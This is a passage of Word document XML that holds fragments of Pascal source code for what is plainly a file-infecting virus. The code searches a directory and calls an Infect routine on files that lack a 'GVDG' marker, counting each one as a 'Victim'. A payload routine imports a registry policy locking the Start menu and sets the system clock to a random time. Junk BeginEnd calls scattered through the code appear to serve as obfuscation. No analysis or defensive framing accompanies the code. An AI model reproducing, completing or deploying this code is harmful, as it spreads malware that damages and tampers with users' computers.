      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="67E3B7C4" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  {$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>-}reset</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(f,1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260DD802" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  Close(f</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);{</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>+}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C249D97" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  IF </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ioresult</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>=0 then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BE9408" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    Begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6141B937" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      Assign(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f,dir+sr.name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">(-8876); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316B69AB" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      reset(f,1); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">-1178); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C1942D" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>FileSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(f)&gt;1000 then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5E27AA" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      Begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402469C5" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">        seek(f,85</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4FFA74B5" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>blockread</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f,Buf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>,4);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="565C2682" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">        Close(f</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="283E3281" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">        if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Buf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>&lt;&gt;'GVDG' then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75243A34" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">         begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D9D7B4" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>inc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Victim);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0534BCC8" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">           Infect(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir,sr.name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">(-2877); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="533AF476" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="17C1285D" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      end</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683634ED" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02994A55" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      Close(f</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4DC55760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gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="26B5D612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spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>findnext</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>sr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">-2081); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E23301" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  end</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08CB6543" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  else </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>exit;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="7DF88225" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="41A5B83B" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">procedure </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>InRun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Run : integer);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9993C4" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>var</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C681FF" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> file;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7575EB86" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>txt :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> text;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D9765B" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BufVir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Bufer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9E5281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NumRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> Word;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D009B6" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281165DB" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>if Run=1 then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7D5B20" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A1DA8EC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Musor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0EE65ED2" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  Assign(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>txt,getenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">('TMP')+'reg'); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">(-2191); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D06625" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  rewrite(txt</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="73EB7AB2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writeln</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>txt,'Windows</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> Registry Editor Version 5.00'); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">(10138); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCEF607" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  write(txt,'[HKEY_CURRENT_USER\Software\Microsoft\'</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3DC12BA8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r w:rsidRPr="008231FF">
        <w:t>writeln</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>txt,'Windows</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>\CurrentVersion\Policies\Explorer]'</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="36B49FF4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r w:rsidRPr="008231FF">
        <w:t>writeln</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(txt,'"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>NoChangeStartMenu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>"=dword:00000001'</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4A6917E6" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  Close(txt</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3CC6BE9A" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  exec(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>getenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>('</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>comspec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>'),'/c reg import '+</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>getenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>('TMP</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>')+</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>'reg');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8AF0F0" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  exec(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>getenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>('</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>comspec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">'),'/c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>cls'</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0049FC9C" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  erase(txt</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="316CA2D9" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  exec(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>getenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>('</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Comspec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">'),'/c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> /c time '+</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>IntToStr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(random(24</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>))+</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>':'+</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>IntToStr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(random(60))+':00,00');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB01ED3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writeln</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>'Hallo, World!!!');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129B4B2A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end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6A9F3ACF" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  Assign(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f,paramstr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
